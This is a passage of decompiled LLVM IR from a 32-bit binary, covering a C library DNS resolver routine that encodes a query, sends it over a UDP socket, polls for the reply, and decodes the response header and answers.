  %v3_8052fbe = inttoptr i32 %v2_8052fbe to i32*
  store i32 %v2_8052fba, i32* %v3_8052fbe, align 4
  %v1_8052fbf = add i32 %v0_8052fb6, 216
  store i32 %v1_8052fbf, i32* @eax, align 4
  %v3_8052fc6 = inttoptr i32 %v0_8052fb6 to i32*
  store i32 %v1_8052fbf, i32* %v3_8052fc6, align 4
  %v0_8052fc7 = call i32 @__encode_question()
  store i32 %v0_8052fc7, i32* %eax.global-to-local, align 4
  %v0_8052fcc = load i32, i32* @esp, align 4
  %v2_8052fcf = icmp slt i32 %v0_8052fc7, 0
  store i32 %v0_8052fc7, i32* @esi, align 4
  br i1 %v2_8052fcf, label %dec_label_pc_8053435, label %dec_label_pc_8052fd9

dec_label_pc_8052fd9:                             ; preds = %dec_label_pc_8052f7a
  %v1_8052fd9 = add i32 %v0_8052fcc, 172
  %v2_8052fd9 = inttoptr i32 %v1_8052fd9 to i16*
  store i16 2, i16* %v2_8052fd9, align 2
  %v1_8052fe3 = load i32, i32* @esp, align 4
  %v2_8052fe3 = add i32 %v1_8052fe3, -4
  %v3_8052fe3 = inttoptr i32 %v2_8052fe3 to i32*
  store i32 %v0_8052fc7, i32* %v3_8052fe3, align 4
  %v1_8052fe4 = add i32 %v1_8052fe3, 164
  store i32 %v1_8052fe4, i32* %eax.global-to-local, align 4
  %v2_8052feb = add i32 %v1_8052fe3, -8
  %v3_8052feb = inttoptr i32 %v2_8052feb to i32*
  store i32 %v1_8052fe4, i32* %v3_8052feb, align 4
  %v1_8052fec = add i32 %v1_8052fe3, 32
  %v2_8052fec = inttoptr i32 %v1_8052fec to i32*
  %v3_8052fec = load i32, i32* %v2_8052fec, align 4
  %v5_8052fec = add i32 %v1_8052fe3, -12
  %v6_8052fec = inttoptr i32 %v5_8052fec to i32*
  store i32 %v3_8052fec, i32* %v6_8052fec, align 4
  %v1_8052ff0 = add i32 %v1_8052fe3, -16
  %v2_8052ff0 = inttoptr i32 %v1_8052ff0 to i32*
  store i32 10, i32* %v2_8052ff0, align 4
  %v5_8052ff2 = call i32 @inet_pton(i32 -1, i8* %v4_8052ff2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8052ff2, i32* %eax.global-to-local, align 4
  %v0_8052ff7 = load i32, i32* @esp, align 4
  %v1_8052ff7 = add i32 %v0_8052ff7, 16
  %tmp47 = icmp slt i32 %v5_8052ff2, 1
  br i1 %tmp47, label %dec_label_pc_8053008, label %dec_label_pc_8052ffe

dec_label_pc_8052ffe:                             ; preds = %dec_label_pc_8052fd9
  %v1_8052ffe = add i32 %v0_8052ff7, 172
  %v2_8052ffe = inttoptr i32 %v1_8052ffe to i16*
  store i16 10, i16* %v2_8052ffe, align 2
  %v0_8053008.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053008

dec_label_pc_8053008:                             ; preds = %dec_label_pc_8052fd9, %dec_label_pc_8052ffe
  %v0_805301f = phi i32 [ %v1_8052ff7, %dec_label_pc_8052fd9 ], [ %v0_8053008.pre, %dec_label_pc_8052ffe ]
  %v1_8053008 = add i32 %v0_805301f, 156
  %v2_8053008 = inttoptr i32 %v1_8053008 to i16*
  %v3_8053008 = load i16, i16* %v2_8053008, align 2
  %v12_8053008 = icmp eq i16 %v3_8053008, 10
  %v1_8053011 = icmp eq i1 %v12_8053008, false
  %v1_805301f = add i32 %v0_805301f, 158
  %v2_805301f = inttoptr i32 %v1_805301f to i16*
  store i16 13568, i16* %v2_805301f, align 2
  %v0_8053029 = load i32, i32* @esp, align 4
  br i1 %v1_8053011, label %dec_label_pc_805301f, label %dec_label_pc_805303f

dec_label_pc_805301f:                             ; preds = %dec_label_pc_8053008
  %v1_805302c = add i32 %v0_8053029, 32
  %v2_805302c = inttoptr i32 %v1_805302c to i32*
  %v3_805302c = load i32, i32* %v2_805302c, align 4
  %v5_805302c = add i32 %v0_8053029, -16
  %v6_805302c = inttoptr i32 %v5_805302c to i32*
  store i32 %v3_805302c, i32* %v6_805302c, align 4
  %v1_8053030 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8053030, i32* %eax.global-to-local, align 4
  %v1_8053035 = load i32, i32* @esp, align 4
  %v2_8053035 = add i32 %v1_8053035, 176
  %v3_8053035 = inttoptr i32 %v2_8053035 to i32*
  store i32 %v1_8053030, i32* %v3_8053035, align 4
  %v0_805303c = load i32, i32* @esp, align 4
  %v1_805303c = add i32 %v0_805303c, 16
  br label %dec_label_pc_805303f

dec_label_pc_805303f:                             ; preds = %dec_label_pc_8053008, %dec_label_pc_805301f
  %v1_805303f = phi i32 [ %v1_805303c, %dec_label_pc_805301f ], [ %v0_8053029, %dec_label_pc_8053008 ]
  %v0_805303f = load i32, i32* @ecx, align 4
  %v2_805303f = add i32 %v1_805303f, -4
  %v3_805303f = inttoptr i32 %v2_805303f to i32*
  store i32 %v0_805303f, i32* %v3_805303f, align 4
  %v1_8053040 = add i32 %v1_805303f, -8
  %v2_8053040 = inttoptr i32 %v1_8053040 to i32*
  store i32 17, i32* %v2_8053040, align 4
  %v1_8053042 = add i32 %v1_805303f, -12
  %v2_8053042 = inttoptr i32 %v1_8053042 to i32*
  store i32 2, i32* %v2_8053042, align 4
  %v1_8053044 = add i32 %v1_805303f, 156
  %v2_8053044 = inttoptr i32 %v1_8053044 to i16*
  %v3_8053044 = load i16, i16* %v2_8053044, align 2
  %v4_8053044 = zext i16 %v3_8053044 to i32
  store i32 %v4_8053044, i32* %eax.global-to-local, align 4
  %v2_805304c = add i32 %v1_805303f, -16
  %v3_805304c = inttoptr i32 %v2_805304c to i32*
  store i32 %v4_8053044, i32* %v3_805304c, align 4
  %v3_805304d = call i32 @socket(i32 -1, i32 %v15_8052e30, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805304d, i32* %eax.global-to-local, align 4
  %v1_8053052 = load i32, i32* @esp, align 4
  %v2_8053052 = add i32 %v1_8053052, 36
  %v3_8053052 = inttoptr i32 %v2_8053052 to i32*
  store i32 %v3_805304d, i32* %v3_8053052, align 4
  %v0_8053056 = load i32, i32* @esp, align 4
  %v1_8053056 = add i32 %v0_8053056, 16
  %v0_8053059 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053059 = icmp slt i32 %v0_8053059, 0
  br i1 %v2_8053059, label %dec_label_pc_8053086, label %dec_label_pc_805305d

dec_label_pc_805305d:                             ; preds = %dec_label_pc_805303f
  %v1_805305d = add i32 %v0_8053056, 172
  store i32 %v1_805305d, i32* %eax.global-to-local, align 4
  %v0_8053064 = load i32, i32* @edx, align 4
  %v2_8053064 = add i32 %v0_8053056, 12
  %v3_8053064 = inttoptr i32 %v2_8053064 to i32*
  store i32 %v0_8053064, i32* %v3_8053064, align 4
  %v1_8053065 = add i32 %v0_8053056, 8
  %v2_8053065 = inttoptr i32 %v1_8053065 to i32*
  store i32 28, i32* %v2_8053065, align 4
  %v0_8053067 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053067 = add i32 %v0_8053056, 4
  %v3_8053067 = inttoptr i32 %v2_8053067 to i32*
  store i32 %v0_8053067, i32* %v3_8053067, align 4
  %v1_8053068 = add i32 %v0_8053056, 36
  %v2_8053068 = inttoptr i32 %v1_8053068 to i32*
  %v3_8053068 = load i32, i32* %v2_8053068, align 4
  %v6_8053068 = inttoptr i32 %v0_8053056 to i32*
  store i32 %v3_8053068, i32* %v6_8053068, align 4
  %v3_805306c = call i32 @__libc_connect(i32 -1, i32 %v15_8052e30, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805306c, i32* %eax.global-to-local, align 4
  %v0_8053071 = load i32, i32* @esp, align 4
  %v2_8053074 = icmp slt i32 %v3_805306c, 0
  %v1_8053076 = icmp eq i1 %v2_8053074, false
  br i1 %v1_8053076, label %dec_label_pc_805308f, label %dec_label_pc_8053078

dec_label_pc_8053078:                             ; preds = %dec_label_pc_805305d
  %v1_8053078 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8053078, i32* %eax.global-to-local, align 4
  %v1_805307d = inttoptr i32 %v1_8053078 to i32*
  %v2_805307d = load i32, i32* %v1_805307d, align 4
  %v11_805307d = icmp eq i32 %v2_805307d, 101
  %v0_80533ef.pre = load i32, i32* @esp, align 4
  br i1 %v11_805307d, label %dec_label_pc_80533ef, label %dec_label_pc_8053086

dec_label_pc_8053086:                             ; preds = %dec_label_pc_8053078, %dec_label_pc_805303f
  %v17_8053086 = phi i32 [ %v1_8053056, %dec_label_pc_805303f ], [ %v0_80533ef.pre, %dec_label_pc_8053078 ]
  %v1_8053086 = add i32 %v17_8053086, 28
  %v2_8053086 = inttoptr i32 %v1_8053086 to i32*
  %v3_8053086 = load i32, i32* %v2_8053086, align 4
  %v4_8053086 = add i32 %v3_8053086, 1
  store i32 %v4_8053086, i32* %v2_8053086, align 4
  br label %dec_label_pc_8053410.backedge

dec_label_pc_805308f:                             ; preds = %dec_label_pc_805305d
  %v1_805308f = add i32 %v0_8053071, 12
  %v2_805308f = inttoptr i32 %v1_805308f to i32*
  store i32 0, i32* %v2_805308f, align 4
  %v0_8053091 = load i32, i32* @ebx, align 4
  %v1_8053091 = load i32, i32* @esi, align 4
  %v2_8053091 = add i32 %v1_8053091, %v0_8053091
  store i32 %v2_8053091, i32* %eax.global-to-local, align 4
  %v2_8053094 = add i32 %v0_8053071, 8
  %v3_8053094 = inttoptr i32 %v2_8053094 to i32*
  store i32 %v2_8053091, i32* %v3_8053094, align 4
  %v2_8053095 = add i32 %v0_8053071, 4
  %v3_8053095 = inttoptr i32 %v2_8053095 to i32*
  store i32 %v2_8052da2, i32* %v3_8053095, align 4
  %v1_8053096 = add i32 %v0_8053071, 36
  %v2_8053096 = inttoptr i32 %v1_8053096 to i32*
  %v3_8053096 = load i32, i32* %v2_8053096, align 4
  %v6_8053096 = inttoptr i32 %v0_8053071 to i32*
  store i32 %v3_8053096, i32* %v6_8053096, align 4
  %v4_805309a = call i32 @__libc_send(i32 -1, i32 %v15_8052e30, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805309a, i32* %eax.global-to-local, align 4
  %v0_805309f = load i32, i32* @esp, align 4
  %v1_805309f = add i32 %v0_805309f, 36
  %v2_805309f = inttoptr i32 %v1_805309f to i32*
  %v3_805309f = load i32, i32* %v2_805309f, align 4
  store i32 %v3_805309f, i32* %eax.global-to-local, align 4
  %v1_80530a3 = add i32 %v0_805309f, 232
  %v2_80530a3 = inttoptr i32 %v1_80530a3 to i16*
  store i16 1, i16* %v2_80530a3, align 2
  %v0_80530ad = load i32, i32* %eax.global-to-local, align 4
  %v1_80530ad = load i32, i32* @esp, align 4
  %v2_80530ad = add i32 %v1_80530ad, 228
  %v3_80530ad = inttoptr i32 %v2_80530ad to i32*
  store i32 %v0_80530ad, i32* %v3_80530ad, align 4
  %v0_80530b4 = load i32, i32* @esp, align 4
  %v1_80530b7 = add i32 %v0_80530b4, 8
  %v2_80530b7 = inttoptr i32 %v1_80530b7 to i32*
  store i32 10000, i32* %v2_80530b7, align 4
  %v1_80530bc = add i32 %v0_80530b4, 4
  %v2_80530bc = inttoptr i32 %v1_80530bc to i32*
  store i32 1, i32* %v2_80530bc, align 4
  %v1_80530be = add i32 %v0_80530b4, 228
  store i32 %v1_80530be, i32* %eax.global-to-local, align 4
  %v3_80530c5 = inttoptr i32 %v0_80530b4 to i32*
  store i32 %v1_80530be, i32* %v3_80530c5, align 4
  %v0_80530c6 = call i32 @__libc_poll()
  store i32 %v0_80530c6, i32* %eax.global-to-local, align 4
  %v0_80530cb = load i32, i32* @esp, align 4
  %v1_80530cb = add i32 %v0_80530cb, 16
  %tmp48 = icmp slt i32 %v0_80530c6, 1
  br i1 %tmp48, label %dec_label_pc_80533ef, label %dec_label_pc_80530d6

dec_label_pc_80530d6:                             ; preds = %dec_label_pc_805308f
  %v1_80530d6 = add i32 %v0_80530cb, 12
  %v2_80530d6 = inttoptr i32 %v1_80530d6 to i32*
  store i32 0, i32* %v2_80530d6, align 4
  %v1_80530d8 = add i32 %v0_80530cb, 8
  %v2_80530d8 = inttoptr i32 %v1_80530d8 to i32*
  store i32 512, i32* %v2_80530d8, align 4
  %v2_80530dd = add i32 %v0_80530cb, 4
  %v3_80530dd = inttoptr i32 %v2_80530dd to i32*
  store i32 %v2_8052da2, i32* %v3_80530dd, align 4
  %v1_80530de = add i32 %v0_80530cb, 36
  %v2_80530de = inttoptr i32 %v1_80530de to i32*
  %v3_80530de = load i32, i32* %v2_80530de, align 4
  %v6_80530de = inttoptr i32 %v0_80530cb to i32*
  store i32 %v3_80530de, i32* %v6_80530de, align 4
  %v4_80530e2 = call i32 @__libc_recv(i32 -1, i32 %v15_8052e30, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80530e2, i32* @eax, align 4
  %v1_80530e7 = load i32, i32* @esp, align 4
  %v2_80530e7 = add i32 %v1_80530e7, 32
  %v3_80530e7 = inttoptr i32 %v2_80530e7 to i32*
  store i32 %v4_80530e2, i32* %v3_80530e7, align 4
  %v0_80530eb = load i32, i32* @esp, align 4
  %v1_80530eb = add i32 %v0_80530eb, 16
  %v7_80530f1 = icmp sgt i32 %v4_80530e2, 11
  br i1 %v7_80530f1, label %dec_label_pc_80530f7, label %dec_label_pc_80533a4

dec_label_pc_80530f7:                             ; preds = %dec_label_pc_80530d6
  %v0_80530f7 = load i32, i32* @ebx, align 4
  %v2_80530f7 = add i32 %v0_80530eb, 12
  %v3_80530f7 = inttoptr i32 %v2_80530f7 to i32*
  store i32 %v0_80530f7, i32* %v3_80530f7, align 4
  %v0_80530f8 = load i32, i32* @ebx, align 4
  %v2_80530f8 = add i32 %v0_80530eb, 8
  %v3_80530f8 = inttoptr i32 %v2_80530f8 to i32*
  store i32 %v0_80530f8, i32* %v3_80530f8, align 4
  %v1_80530f9 = add i32 %v0_80530eb, 84
  store i32 %v1_80530f9, i32* %eax.global-to-local, align 4
  %v2_80530fd = add i32 %v0_80530eb, 4
  %v3_80530fd = inttoptr i32 %v2_80530fd to i32*
  store i32 %v1_80530f9, i32* %v3_80530fd, align 4
  %v3_80530fe = inttoptr i32 %v0_80530eb to i32*
  store i32 %v2_8052da2, i32* %v3_80530fe, align 4
  %v0_80530ff = call i32 @__decode_header()
  store i32 %v0_80530ff, i32* %eax.global-to-local, align 4
  %v0_8053104 = load i32, i32* @esp, align 4
  %v1_8053104 = add i32 %v0_8053104, 84
  %v2_8053104 = inttoptr i32 %v1_8053104 to i32*
  %v3_8053104 = load i32, i32* %v2_8053104, align 4
  store i32 %v3_8053104, i32* %edx.global-to-local, align 4
  %v2_8053108 = add i32 %v0_8053104, 60
  %v3_8053108 = inttoptr i32 %v2_8053108 to i32*
  store i32 %v3_8053104, i32* %v3_8053108, align 4
  %v0_805310c = load i32, i32* @esp, align 4
  %v1_805310c = add i32 %v0_805310c, 16
  %v1_805310f = add i32 %v0_805310c, 72
  %v2_805310f = inttoptr i32 %v1_805310f to i32*
  %v3_805310f = load i32, i32* %v2_805310f, align 4
  store i32 %v3_805310f, i32* @eax, align 4
  %v0_8053113 = load i32, i32* %edx.global-to-local, align 4
  %v12_8053113 = icmp eq i32 %v0_8053113, %v3_805310f
  %v1_8053115 = icmp eq i1 %v12_8053113, false
  br i1 %v1_8053115, label %dec_label_pc_80533a4, label %dec_label_pc_805311b

dec_label_pc_805311b:                             ; preds = %dec_label_pc_80530f7
  %v1_805311b = add i32 %v0_805310c, 88
  %v2_805311b = inttoptr i32 %v1_805311b to i32*
  %v3_805311b = load i32, i32* %v2_805311b, align 4
  %v4_805311b = icmp eq i32 %v3_805311b, 0
  br i1 %v4_805311b, label %dec_label_pc_80533a4, label %dec_label_pc_8053126

dec_label_pc_8053126:                             ; preds = %dec_label_pc_805311b
  %v1_8053126 = add i32 %v0_805310c, 112
  %v2_8053126 = inttoptr i32 %v1_8053126 to i32*
  %v3_8053126 = load i32, i32* %v2_8053126, align 4
  store i32 %v3_8053126, i32* @eax, align 4
  %v9_805312a = icmp eq i32 %v3_8053126, 3
  %v1_805312d = icmp eq i1 %v9_805312a, false
  br i1 %v1_805312d, label %dec_label_pc_8053195, label %dec_label_pc_805312f

dec_label_pc_805312f:                             ; preds = %dec_label_pc_8053126
  %v1_805312f = add i32 %v0_805310c, 67
  %v2_805312f = inttoptr i32 %v1_805312f to i8*
  %v3_805312f = load i8, i8* %v2_805312f, align 1
  %v4_805312f = icmp eq i8 %v3_805312f, 0
  %v1_8053134 = icmp eq i1 %v4_805312f, false
  br i1 %v1_8053134, label %dec_label_pc_8053185, label %dec_label_pc_8053136

dec_label_pc_8053136:                             ; preds = %dec_label_pc_805312f
  %v0_8053136 = load i32, i32* @ecx, align 4
  %v2_8053136 = add i32 %v0_805310c, 12
  %v3_8053136 = inttoptr i32 %v2_8053136 to i32*
  store i32 %v0_8053136, i32* %v3_8053136, align 4
  %v1_8053137 = add i32 %v0_805310c, 8
  %v2_8053137 = inttoptr i32 %v1_8053137 to i32*
  store i32 ptrtoint (i32* @global_var_8058488.173 to i32), i32* %v2_8053137, align 4
  %v1_805313c = add i32 %v0_805310c, 4
  %v2_805313c = inttoptr i32 %v1_805313c to i32*
  store i32 134552147, i32* %v2_805313c, align 4
  %v1_8053141 = add i32 %v0_805310c, 200
  store i32 %v1_8053141, i32* @esi, align 4
  %v3_8053148 = inttoptr i32 %v0_805310c to i32*
  store i32 %v1_8053141, i32* %v3_8053148, align 4
  %v2_8053149 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052e30)
  store i32 %v2_8053149, i32* %eax.global-to-local, align 4
  %v0_805314e = load i32, i32* @esp, align 4
  %v1_805314e = inttoptr i32 %v0_805314e to i32*
  store i32 ptrtoint (i32* @global_var_8058488.173 to i32), i32* %v1_805314e, align 4
  %v1_8053155 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8053155, i32* %eax.global-to-local, align 4
  %v0_805315a = load i32, i32* @global_var_805eb78.234, align 8
  store i32 %v0_805315a, i32* %ebx.global-to-local, align 4
  %v0_8053160 = load i32, i32* @esp, align 4
  %v1_8053160 = inttoptr i32 %v0_8053160 to i32*
  %v2_8053160 = load i32, i32* %v1_8053160, align 4
  store i32 %v2_8053160, i32* @eax, align 4
  %v3_8053160 = add i32 %v0_8053160, 4
  %v1_8053161 = inttoptr i32 %v3_8053160 to i32*
  %v2_8053161 = load i32, i32* %v1_8053161, align 4
  store i32 %v2_8053161, i32* %edx.global-to-local, align 4
  %v1_8053162 = add i32 %v0_805315a, -1
  store i32 %v1_8053162, i32* @ebx, align 4
  store i32 1, i32* %v1_8053161, align 4
  %v0_8053165 = load i32, i32* @esi, align 4
  store i32 %v0_8053165, i32* %v1_8053160, align 4
  %v2_8053166 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052e30)
  store i32 %v2_8053166, i32* %eax.global-to-local, align 4
  %v0_805316b = load i32, i32* @esp, align 4
  %v1_805316e = add i32 %v0_805316b, 52
  %v2_805316e = inttoptr i32 %v1_805316e to i32*
  %v3_805316e = load i32, i32* %v2_805316e, align 4
  %v4_805316e = load i32, i32* @ebx, align 4
  %v5_805316e = sub i32 %v3_805316e, %v4_805316e
  %v11_805316e = xor i32 %v4_805316e, %v3_805316e
  %v12_805316e = xor i32 %v5_805316e, %v3_805316e
  %v13_805316e = and i32 %v12_805316e, %v11_805316e
  %v14_805316e = icmp slt i32 %v13_805316e, 0
  %v16_805316e = icmp slt i32 %v5_805316e, 0
  %v2_8053172 = icmp eq i1 %v16_805316e, %v14_805316e
  br i1 %v2_8053172, label %dec_label_pc_8053185, label %dec_label_pc_8053174

dec_label_pc_8053174:                             ; preds = %dec_label_pc_8053136
  %v1_8053174 = add i32 %v0_805316b, 60
  %v2_8053174 = inttoptr i32 %v1_8053174 to i32*
  %v3_8053174 = load i32, i32* %v2_8053174, align 4
  store i32 %v3_8053174, i32* %edx.global-to-local, align 4
  %v3_8053178 = load i32, i32* %v2_805316e, align 4
  %v4_8053178 = add i32 %v3_8053178, 1
  store i32 %v4_8053178, i32* %v2_805316e, align 4
  %v0_805317c = load i32, i32* %edx.global-to-local, align 4
  %v1_805317c = load i32, i32* @esp, align 4
  %v2_805317c = add i32 %v1_805317c, 56
  %v3_805317c = inttoptr i32 %v2_805317c to i32*
  store i32 %v0_805317c, i32* %v3_805317c, align 4
  br label %dec_label_pc_8053410.backedge

dec_label_pc_8053185:                             ; preds = %dec_label_pc_8053136, %dec_label_pc_805312f
  %v0_8053185 = call i32 @__GI___h_errno_location()
  store i32 %v0_8053185, i32* %eax.global-to-local, align 4
  %v1_805318a = inttoptr i32 %v0_8053185 to i32*
  store i32 1, i32* %v1_805318a, align 4
  br label %dec_label_pc_8053448

dec_label_pc_8053195:                             ; preds = %dec_label_pc_8053126
  %v1_8053195 = icmp eq i32 %v3_8053126, 0
  %v1_8053197 = icmp eq i1 %v1_8053195, false
  br i1 %v1_8053197, label %dec_label_pc_80533a4, label %dec_label_pc_805319d

dec_label_pc_805319d:                             ; preds = %dec_label_pc_8053195
  %v1_805319d = add i32 %v0_805310c, 120
  %v2_805319d = inttoptr i32 %v1_805319d to i32*
  %v3_805319d = load i32, i32* %v2_805319d, align 4
  %tmp49 = icmp slt i32 %v3_805319d, 1
  br i1 %tmp49, label %dec_label_pc_80531ad, label %dec_label_pc_80531a4

dec_label_pc_80531a4:                             ; preds = %dec_label_pc_805319d
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80531cc

dec_label_pc_80531ad:                             ; preds = %dec_label_pc_805319d
  %v0_80531ad = call i32 @__GI___h_errno_location()
  store i32 %v0_80531ad, i32* %eax.global-to-local, align 4
  %v1_80531b2 = inttoptr i32 %v0_80531ad to i32*
  store i32 4, i32* %v1_80531b2, align 4
  br label %dec_label_pc_8053448

dec_label_pc_80531bd:                             ; preds = %dec_label_pc_80531cc
  %v2_80531bd = add i32 %v0_80531d4, -4
  %v3_80531bd = inttoptr i32 %v2_80531bd to i32*
  store i32 %v0_80531bd, i32* %v3_80531bd, align 4
  %v0_80531be = load i32, i32* @ebx, align 4
  %v1_80531be = add i32 %v0_80531be, 1
  store i32 %v1_80531be, i32* @ebx, align 4
  %v0_80531bf = load i32, i32* @eax, align 4
  %v2_80531bf = add i32 %v0_80531d4, -8
  %v3_80531bf = inttoptr i32 %v2_80531bf to i32*
  store i32 %v0_80531bf, i32* %v3_80531bf, align 4
  %v0_80531c0 = load i32, i32* @esi, align 4
  %v2_80531c0 = add i32 %v0_80531d4, -12
  %v3_80531c0 = inttoptr i32 %v2_80531c0 to i32*
  store i32 %v0_80531c0, i32* %v3_80531c0, align 4
  %v2_80531c1 = add i32 %v0_80531d4, -16
  %v3_80531c1 = inttoptr i32 %v2_80531c1 to i32*
  store i32 %v2_8052da2, i32* %v3_80531c1, align 4
  %v0_80531c2 = call i32 @__length_question()
  store i32 %v0_80531c2, i32* @eax, align 4
  %v0_80531c7 = load i32, i32* @esp, align 4
  %v1_80531c7 = add i32 %v0_80531c7, 16
  %v0_80531ca = load i32, i32* @esi, align 4
  %v2_80531ca = add i32 %v0_80531ca, %v0_80531c2
  %v0_80531cc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80531cc

dec_label_pc_80531cc:                             ; preds = %dec_label_pc_80531a4, %dec_label_pc_80531bd
  %v0_80531bd = phi i32 [ %v3_8053126, %dec_label_pc_80531a4 ], [ %v0_80531c2, %dec_label_pc_80531bd ]
  %v0_80531d4 = phi i32 [ %v1_805310c, %dec_label_pc_80531a4 ], [ %v1_80531c7, %dec_label_pc_80531bd ]
  %v0_80531cc = phi i32 [ 0, %dec_label_pc_80531a4 ], [ %v0_80531cc.pre, %dec_label_pc_80531bd ]
  %storemerge = phi i32 [ 12, %dec_label_pc_80531a4 ], [ %v2_80531ca, %dec_label_pc_80531bd ]
  store i32 %storemerge, i32* @esi, align 4
  %v2_80531cc = add i32 %v0_80531d4, 100
  %v3_80531cc = inttoptr i32 %v2_80531cc to i32*
  %v4_80531cc = load i32, i32* %v3_80531cc, align 4
  %v5_80531cc = sub i32 %v0_80531cc, %v4_80531cc
  %v11_80531cc = xor i32 %v4_80531cc, %v0_80531cc
  %v12_80531cc = xor i32 %v5_80531cc, %v0_80531cc
  %v13_80531cc = and i32 %v12_80531cc, %v11_80531cc
  %v14_80531cc = icmp slt i32 %v13_80531cc, 0
  %v16_80531cc = icmp slt i32 %v5_80531cc, 0
  %v2_80531d0 = icmp eq i1 %v16_80531cc, %v14_80531cc
  br i1 %v2_80531d0, label %dec_label_pc_80531d2, label %dec_label_pc_80531bd

dec_label_pc_80531d2:                             ; preds = %dec_label_pc_80531cc
  store i32 0, i32* @ebx, align 4
  %v1_80531d4 = add i32 %v0_80531d4, 27
  %v2_80531d4 = inttoptr i32 %v1_80531d4 to i8*
  store i8 1, i8* %v2_80531d4, align 1
  %v0_8053302.pre = load i32, i32* @ebx, align 4
  %v1_8053302.pre = load i32, i32* @esp, align 4
  %v2_805330255 = add i32 %v1_8053302.pre, 104
  %v3_805330256 = inttoptr i32 %v2_805330255 to i32*
  %v4_805330257 = load i32, i32* %v3_805330256, align 4
  %v5_805330258 = sub i32 %v0_8053302.pre, %v4_805330257
  %v11_805330260 = xor i32 %v4_805330257, %v0_8053302.pre
  %v12_805330261 = xor i32 %v5_805330258, %v0_8053302.pre
  %v13_805330262 = and i32 %v12_805330261, %v11_805330260
  %v14_805330263 = icmp slt i32 %v13_805330262, 0
  %v16_805330265 = icmp slt i32 %v5_805330258, 0
  %v2_805330666 = icmp eq i1 %v16_805330265, %v14_805330263
  br i1 %v2_805330666, label %dec_label_pc_8053312, label %dec_label_pc_8053308.lr.ph

dec_label_pc_8053308.lr.ph:                       ; preds = %dec_label_pc_80531d2
  %v0_8053308.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053308

dec_label_pc_80531de:                             ; preds = %dec_label_pc_8053308
  %v1_80531de = add i32 %v0_80531de67, 116
  store i32 %v1_80531de, i32* %eax.global-to-local, align 4
  %v2_80531e2 = add i32 %v0_80531de67, -4
  %v3_80531e2 = inttoptr i32 %v2_80531e2 to i32*
  store i32 %v1_80531de, i32* %v3_80531e2, align 4
  %v3_80531e3 = load i32, i32* %v3_8053308, align 4
  %v5_80531e3 = add i32 %v0_80531de67, -8
  %v6_80531e3 = inttoptr i32 %v5_80531e3 to i32*
  store i32 %v3_80531e3, i32* %v6_80531e3, align 4
  %v0_80531e7 = load i32, i32* @esi, align 4
  %v2_80531e7 = add i32 %v0_80531de67, -12
  %v3_80531e7 = inttoptr i32 %v2_80531e7 to i32*
  store i32 %v0_80531e7, i32* %v3_80531e7, align 4
  %v2_80531e8 = add i32 %v0_80531de67, -16
  %v3_80531e8 = inttoptr i32 %v2_80531e8 to i32*
  store i32 %v2_8052da2, i32* %v3_80531e8, align 4
  %v0_80531e9 = call i32 @__decode_answer()
  store i32 %v0_80531e9, i32* @eax, align 4
  %v1_80531ee = load i32, i32* @esp, align 4
  %v2_80531ee = add i32 %v1_80531ee, 68
  %v3_80531ee = inttoptr i32 %v2_80531ee to i32*
  store i32 %v0_80531e9, i32* %v3_80531ee, align 4
  %v0_80531f2 = load i32, i32* @esp, align 4
  %v1_80531f2 = add i32 %v0_80531f2, 16
  %v2_80531f5 = icmp slt i32 %v0_80531e9, 0
  %v1_80531f7 = icmp eq i1 %v2_80531f5, false
  br i1 %v1_80531f7, label %dec_label_pc_8053211, label %dec_label_pc_80531f9

dec_label_pc_80531f9:                             ; preds = %dec_label_pc_80531de
  %v0_80531f9 = load i32, i32* @ebx, align 4
  %v1_80531f9 = icmp eq i32 %v0_80531f9, 0
  br i1 %v1_80531f9, label %dec_label_pc_80533a4, label %dec_label_pc_8053201

dec_label_pc_8053201:                             ; preds = %dec_label_pc_80531f9
  %v1_8053201 = add i32 %v0_80531f2, 100
  %v2_8053201 = inttoptr i32 %v1_8053201 to i32*
  %v3_8053201 = load i32, i32* %v2_8053201, align 4
  %v4_8053201 = icmp eq i32 %v3_8053201, 0
  br i1 %v4_8053201, label %dec_label_pc_80533a4, label %dec_label_pc_8053312

dec_label_pc_8053211:                             ; preds = %dec_label_pc_80531de
  %v1_8053211 = add i32 %v0_80531f2, 43
  %v2_8053211 = inttoptr i32 %v1_8053211 to i8*
  %v3_8053211 = load i8, i8* %v2_8053211, align 1
  %v4_8053211 = icmp eq i8 %v3_8053211, 0
  br i1 %v4_8053211, label %dec_label_pc_80532b2, label %dec_label_pc_805321c

dec_label_pc_805321c:                             ; preds = %dec_label_pc_8053211
  %v0_805321c = load i32, i32* @edi, align 4
  %v1_805321c = add i32 %v0_805321c, 28
  %v2_805321c = inttoptr i32 %v1_805321c to i32*
  %v3_805321c = load i32, i32* %v2_805321c, align 4
  store i32 %v3_805321c, i32* %eax.global-to-local, align 4
  %v2_805321f = add i32 %v0_80531f2, 160
  %v3_805321f = inttoptr i32 %v2_805321f to i32*
  store i32 %v3_805321c, i32* %v3_805321f, align 4
  %v0_8053226 = load i32, i32* @edi, align 4
  %v1_8053226 = add i32 %v0_8053226, 32
  %v2_8053226 = inttoptr i32 %v1_8053226 to i32*
  %v3_8053226 = load i32, i32* %v2_8053226, align 4
  store i32 %v3_8053226, i32* %eax.global-to-local, align 4
  %v1_8053229 = load i32, i32* @esp, align 4
  %v2_8053229 = add i32 %v1_8053229, 148
  %v3_8053229 = inttoptr i32 %v2_8053229 to i32*
  store i32 %v3_8053226, i32* %v3_8053229, align 4
  %v0_8053230 = load i32, i32* @edi, align 4
  %v1_8053230 = add i32 %v0_8053230, 36
  %v2_8053230 = inttoptr i32 %v1_8053230 to i32*
  %v3_8053230 = load i32, i32* %v2_8053230, align 4
